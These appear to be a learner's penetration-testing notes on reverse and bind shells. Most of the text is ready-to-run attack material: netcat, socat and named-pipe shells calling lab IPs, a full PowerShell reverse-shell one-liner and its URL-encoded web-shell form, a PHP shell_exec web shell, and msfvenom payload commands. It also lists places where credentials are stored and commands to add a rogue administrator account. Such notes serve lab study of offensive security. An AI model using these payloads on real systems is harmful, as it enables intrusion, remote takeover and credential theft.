###### Tools
- `socat` like `netcat` but on "steroids"
-  `metasploit/multi/handler` module - like `socat` and `netcat`
-  `msfvenom` - payload generator for reverse and bind shells

###### Netcat
-  reverse shell - the attacker is listening for incoming connections (`nc -lnvp 8080`) and the the target sends a connection to our machine (`nc 10.10.13.49 8080 -e /bin/bash`)
-  bind shell - the target is listening for incoming connections (`nc -lvnp 8080 -e "cmd.exe" or "/bin/bash"`) and the attacker sends the the connection to the target (`nc machine_ip 8080`)

###### Netcat shell stabilization
- `python -c 'import pty;pty.spawn("/bin/bash")'`, `python2`, `python3`
- `export TERM=xterm` - gives access to term commands such as `clear`
- `CTRL + Z` , `stty raw -echo; fg`
-------
- `rlwrap nc -lvnp <port>`
----
- transfer a copy of a [socat static compiled binary](https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat?raw=true) to the target machine. Set up a web server (`sudo python3 http.server 80`) and the target machine could get the binary with (`wget <LOCAL_IP>/socat -O /tmp/socat`). On a windows environment: `Invoke-WebRequest -uri <LOCAL-IP>/socat.exe -outfile C:\\Windows\temp\socat.exe`

###### change terminal tty size
Open another terminal and execute `stty -a`. Note down the values for rows and columns.
In your reverse/bind shell:
- `stty rows <number>`
- `stty cols <number>`

###### socat (reverse shell)
-  listen on port 8080: `socat TCP-L:8080 -`
-  to connect (windows): `socat TCP:<local-ip>:<local-port> EXEC:powershell.exe,pipes`, pipes options used for forcing powershell use unix style standard input and output
-  to connect (linux): `socat TCP:<local-ip>:<local-port> EXEC:"bash -li"`

###### socat (bind shell)
- linux target machine: `socat TCP-L:<port> EXEC:"bash -li"`
- windows target machine: `socat TCP-L:<port> EXEC:powershell.exe,pipes`
- tty technique:
	- `user@attack$ socat file:``tty``,raw,echo=0 TCP-L:4242`
	- `user@victim$ /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.0.1:4242`

###### socat encrypted shells
- generate a certificate in order to use encrypted shells: 
`openssl req --newkey rsa:2048 -nodes -keyout shell.key -x509 -days 362 -out shell.crt`
-  `cat shell.key shell.crt > shell.pem`
-  listen: `socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 -`
-  connect: `socat OPENSSL:<local-ip>:<local-port>,verify=0 EXEC:/bin/bash`


![[unencrypted_reverse_shell_wireshark.png]]

![[encrypted_reverse_shell_wireshark.png]]

-  encrypted listener with tty technique: 
`socat OPENSSL-LISTENER:53,cert=encrypt.pem,verify=0 FILE:``tty``,raw,echo=0`  
- connect back to the listener: `socat OPENSSL:10.10.10.5:53,verify=0 EXEC:"bash -li",pty,stderr,sigint,setsid,sane`

###### Common Shell Payloads:
create a bind shell on a linux machine:
-  `mkfifo /tmp/f; nc -lvnp <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f` with a [named pipe](https://www.linuxjournal.com/article/2156) . `<` used for redirect the contents of a file
-  connect: `mkfifo /tmp/f; nc <LOCAL-IP> <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f` 
- windows (server) one liner: `powershell -c "$client = New-Object System.Net.Sockets.TCPClient('<ip>',<port>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"`
-  [for more cool payloads](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
###### msfvenom
- standard sytax: `msfvenom -p <PAYLOAD> <OPTIONS>`
- win x64 reverse shell in exe format: `msfvenom -p windows/x64/shell/reverse_tcp -f exe -o shell.exe LHOST=<listen-IP> LPORT=<listen-port>` (ports below 1024 which are called **privileged ports** require a listener running with root privileges)
- `msfvenom --list payloads`

###### Metasploit multi/handler
- `msfconsole`
- `use multi/handler` , `options`
- `exploit -j`, the `j` flag is used to tell metasploit to run it as a backgroud **J**ob
- you can have multiple sessions, check`sessions`

###### WebShells
-  `<?php echo "<pre>" . shell_exec($_GET["cmd"]) . "</pre>"; ?>`, this will take the **GET** parameters in the url and execute it on the system using `shell_exec()`. the `<pre>` is used to format the text correctly.
- [PentestMonkey php-reverse-shell](https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php)
- for windows machines, it is better to use shells generated by [[#msfvenom]] or obtain RCE (remote code execution) using a web shell, obtaining RCE is often done with a URL Encoded Powershell Reverse Shell. This would be copied into the URL as the `cmd` argument: `powershellpowershell%20-c%20%22%24client%20%3D%20New-Object%20System.Net.Sockets.TCPClient%28%27<IP>%27%2C<PORT>%29%3B%24stream%20%3D%20%24client.GetStream%28%29%3B%5Bbyte%5B%5D%5D%24bytes%20%3D%200..65535%7C%25%7B0%7D%3Bwhile%28%28%24i%20%3D%20%24stream.Read%28%24bytes%2C%200%2C%20%24bytes.Length%29%29%20-ne%200%29%7B%3B%24data%20%3D%20%28New-Object%20-TypeName%20System.Text.ASCIIEncoding%29.GetString%28%24bytes%2C0%2C%20%24i%29%3B%24sendback%20%3D%20%28iex%20%24data%202%3E%261%20%7C%20Out-String%20%29%3B%24sendback2%20%3D%20%24sendback%20%2B%20%27PS%20%27%20%2B%20%28pwd%29.Path%20%2B%20%27%3E%20%27%3B%24sendbyte%20%3D%20%28%5Btext.encoding%5D%3A%3AASCII%29.GetBytes%28%24sendback2%29%3B%24stream.Write%28%24sendbyte%2C0%2C%24sendbyte.Length%29%3B%24stream.Flush%28%29%7D%3B%24client.Close%28%29%22` (replace `<IP>` and `<PORT>`)

###### Next shells
-  [[ssh (secure shell)]] keys can be found on `/home/<user>/.ssh` to gain access to a user account. 
-  interesting cve: https://dirtycow.ninja/
-  On Windows the options are often more limited. It's sometimes possible to find passwords for running services in the registry. VNC servers, for example, frequently leave passwords in the registry stored in plaintext. Some versions of the FileZilla FTP server also leave credentials in an XML file at `C:\Program Files\FileZilla Server\FileZilla Server.xml` or `C:\xampp\FileZilla Server\FileZilla Server.xml`
-  Ideally on Windows you would obtain a shell running as the SYSTEM user, or an administrator account running with high privileges. In such a situation it's possible to simply add your own account (in the administrators group) to the machine, then log in over RDP, telnet, winexe, psexec, WinRM or any number of other methods, dependent on the services running on the box.
- `net user <username> <password> /add`
- `net localgroup administrators <username> /add`

###### staged linux reverse shell
- `msfvenom -p linux/x64/meterpreter/reverse_tcp -f elf -o shell LHOST=10.10.10.5 LPORT=443`
